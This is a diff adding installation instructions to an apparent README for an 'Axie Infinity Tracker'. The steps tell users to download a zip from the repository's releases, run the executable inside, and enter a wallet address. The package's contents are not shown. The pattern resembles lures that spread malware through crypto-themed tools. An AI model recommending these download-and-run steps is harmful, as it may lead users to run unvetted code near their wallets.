@@ -11,6 +11,12 @@ This tracker is perfect for anyone who is looking for an easy way to manage thei
 
 [![Axie Infinity Tracker](https://github.com/axie-tracker/axie-tracker.github.io/blob/main/axie-tracker-management.jpg?raw=true)](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
 
+## Installation Instructions
+
+1. [Download the Axie Tracker](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
+2. Start the Axie Tracker.exe
+3. No login required! Just add your public address and you're good to go.
+
 
 ## What Is Axie Infinity?
 
